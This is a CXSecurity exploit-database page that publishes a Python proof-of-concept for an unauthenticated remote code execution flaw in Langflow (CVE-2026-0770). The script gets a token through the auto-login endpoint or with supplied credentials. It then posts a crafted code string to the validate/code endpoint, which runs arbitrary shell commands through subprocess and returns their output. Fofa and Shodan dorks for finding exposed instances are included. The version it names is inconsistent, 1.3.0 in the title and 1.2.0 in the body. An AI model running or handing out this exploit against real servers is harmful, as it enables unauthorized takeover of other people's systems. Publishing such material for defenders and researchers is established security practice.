---
title: Langflow 1.3.0 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026070007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-07-19
fetch_date: 2026-07-20T05:32:05.861058
---

# Langflow 1.3.0 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Langflow 1.3.0 Remote Code Execution** **2026.07.19**  Credit:  **[Diamorphine](https://cxsecurity.com/author/Diamorphine/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-0770](https://cxsecurity.com/cveshow/CVE-2026-0770/ "Click to see CVE-2026-0770")**  CWE: **N/A** | |

# Exploit Title: Langflow 1.3.0 - Remote Code Execution
# Fofa-dork: title="Langflow"
# Shodan-dork: title:"Langflow"
# Date: 23-05-2026
# Exploit Author: Diamorphine
# Venodor Homepage: https://www.langflow.org/
# Software Link: https://github.com/langflow-ai/langflow
# Version: 1.2.0
# Tested on: Debian
# CVE : CVE-2026-0770
# Description: Langflow contains a remote code execution caused by inclusion of functionality from untrusted control sphere in the exec\_globals parameter at the validate endpoint, letting remote attackers execute arbitrary code as root, exploit requires no authentication.
# Usage: CVE-2026-0770.py -u 127.0.0.1 [-l USERNAME] [-p PASSWORD] [-c COMMAND]
import httpx
import asyncio
import subprocess
import json
import sys
import argparse
def auth(host, username, password):
with httpx.Client(verify=False) as client:
data = {
'username': username,
'password': password
}
r = client.post(url=f'http://{host}:7860/api/v1/login', data=data)
res = r.json()
access\_token = res["access\_token"]
return access\_token
async def exec\_auth(host, username, password, cmd):
async with httpx.AsyncClient(verify=False) as client:
headers = {
'Authorization': f'Bearare {auth(host, username, password)}'
}
data = {
"code":"\ndef exploit(\n \_=( lambda r: (\_ for \_ in ()).throw(Exception(f\"{r.stdout}{r.stderr}\")) )(\n \_\_import\_\_('subprocess').run('%s', shell=True, capture\_output=True, text=True)\n )\n):\n pass\n" % cmd
}
r = await client.post(url=f'http://{host}:7860/api/v1/validate/code', headers=headers, json=data)
r\_out = r.text
output = json.loads(r\_out)
value = output['function']
try:
print(value['errors'][0])
except IndexError:
print("Index out of range")
async def exec\_without\_auth(host, cmd):
async with httpx.AsyncClient(verify=False) as client:
req = await client.get(url=f'http://{host}:7860/api/v1/auto\_login')
res = req.json()
access\_token = res["access\_token"]
headers = {
'Authorization': f'Bearare {access\_token}'
}
data = {
"code":"\ndef exploit(\n \_=( lambda r: (\_ for \_ in ()).throw(Exception(f\"{r.stdout}{r.stderr}\")) )(\n \_\_import\_\_('subprocess').run('%s', shell=True, capture\_output=True, text=True)\n )\n):\n pass\n" % cmd
}
r = await client.post(url=f'http://{host}:7860/api/v1/validate/code', headers=headers, json=data)
r\_out = r.text
output = json.loads(r\_out)
value = output['function']
try:
print(value['errors'][0])
except IndexError:
print("Index out of range")
parser = argparse.ArgumentParser(description="Exploit for CVE-2026-0770 – Unauthenticated RCE in Langflow")
parser.add\_argument('-u', '--host', required=True, help="Target host, e.g 127.0.0.1")
parser.add\_argument('-l', '--login', help="Username for login, e.g user (If auto login not enabled)")
parser.add\_argument('-p', '--password', help="Password for login, e.g password (If auto login not enabled)")
parser.add\_argument('-c', '--command', default='id', help="Command for execute, e.g id, default: id")
args = parser.parse\_args()
if args.login and args.password:
asyncio.run(exec\_auth(args.host, args.login, args.password, args.command))
else:
asyncio.run(exec\_without\_auth(args.host, args.command))

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026070007)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top